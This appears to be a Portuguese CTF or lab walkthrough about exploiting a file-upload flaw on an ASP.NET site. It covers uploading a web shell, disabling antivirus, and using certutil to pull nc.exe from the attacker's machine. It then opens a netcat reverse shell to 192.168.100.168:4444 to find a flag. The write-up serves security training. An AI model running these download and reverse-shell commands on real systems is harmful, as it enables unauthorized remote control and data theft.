
# Depois de levantar informações específicas como o lugar onde tem uma falha para upar arquivos e deletar, o lugar onde esses arquivos ficam armazenados e ainda conseguir acessar ele.

## Resumindo: tudo favorável para subir o shell.

## Contexto para subir o shell:
Sabendo que a tecnologia do site é ASP.NET, podemos procurar um Shell que seja `.ASPNET.aspx`, upar no servidor e acessar ele para injetar comandos.

# 1️⃣ - Procurar no Google o Shell: `github: shell for ASP.aspx`  
# 2️⃣ - Desligar o antivírus do computador.  
![image](https://github.com/user-attachments/assets/d7a9b6dd-d1a3-463e-a716-488dfa836c1a)

# 3️⃣ - Salvar esse shell no arquivo `.aspx`.  
![image](https://github.com/user-attachments/assets/bf04650c-c0af-4cfc-81c8-9d19ef13cf80)

# 💻 Com ele em mãos, é só subir no servidor e acessar.

Acessando o local que descobrimos no DIRSEARCH que é o `magnam` (faz o trabalho do banco de dados).  
![image](https://github.com/user-attachments/assets/b4f7bf34-f8f4-40a1-b90b-32065c645192)

# ⬆️ Upando arquivo:  
![image](https://github.com/user-attachments/assets/f4923442-491e-49ad-9738-48ca914b4726)

# ✅ Arquivo UPADO, só acessar agora:  
![image](https://github.com/user-attachments/assets/0afbee35-4be9-4f1b-acad-2c5cac33dce3)

# 🔎 Acessando o arquivo:  
![image](https://github.com/user-attachments/assets/634bf72b-4d67-446c-8acc-9bc82da34bbb)

# ⚠️ `shell.aspx` subiu, porém você ainda não tem controle total para navegar nos diretórios e fazer uma enumeração de arquivos.

# 💡 Próximo passo:  
- Baixar o `nc.exe`.
- Colocar em uma pasta no seu próprio Windows.
- Instalar o Python.
- Colocar o arquivo `nc.exe` lá dentro.
- Iniciar o servidor Python com o `nc.exe` disponível para download.  
![image](https://github.com/user-attachments/assets/0b399e9c-440c-48b4-b4c5-8434dad98986)

📂 Coloquei em uma pasta com o nome "Nova Pasta" e iniciei o servidor Python pelo CMD do Windows.  
![image](https://github.com/user-attachments/assets/919c4e88-32e4-4459-adcb-700e80e462e0)

# 📥 Agora para baixar usando o shell que subi, use o comando:

```
certutil -urlcache -split -f http://192.168.100.168/nc.exe c:\users\public\nc.exe

O Certutil serve para baixar arquivos no Windows. Como está em um servidor HTTP,
basta informar o IP do seu PC e o nome do arquivo para ele salvar no `users/public`
com o nome `nc.exe`.
```

# ✅ Depois de rodar o comando, o sistema vai confirmar que deu sucesso:  
![image](https://github.com/user-attachments/assets/20dfd46a-d056-4dd6-ad33-0ae350bcd4a4)

# 📁 Agora é só verificar se ele realmente foi baixado na pasta pública:  
![image](https://github.com/user-attachments/assets/7a58ca23-e926-482a-bac3-34088934c625)

# 🔊 Arquivo upado, precisamos acessar a shell do nosso Windows. Coloque o `nc` para escutar na porta `4444`:  
![image](https://github.com/user-attachments/assets/a5debaf5-4d6b-424a-aa99-a6b3c91a7d13)

# ⚡ Porta escutando, basta executar o comando:

```
c:\users\public\nc.exe 192.168.100.168 4444 -e cmd

Esse comando executa o `nc.exe`,
passando o IP e a porta para conectar e o `-e` para executar o `cmd` do Windows.
```

# 📡 Após executar o comando, a porta que está escutando recebe o `cmd`:  
![image](https://github.com/user-attachments/assets/c7eeac35-cce7-4d21-9c70-6cfaa5b68f9b)

# 💻 Agora é só fazer a enumeração de arquivos e encontrar a flag do arquivo sensível:  
![image](https://github.com/user-attachments/assets/e768c7eb-f61c-4241-8d7e-e2997555c53c)

# 📦 Arquivo sensível encontrado:  
![image](https://github.com/user-attachments/assets/12899b1c-0cff-4350-b986-3f8b8d5d0c39) 
![image](https://github.com/user-attachments/assets/822f7405-3985-4a8a-80b7-05fbe0a33b31)
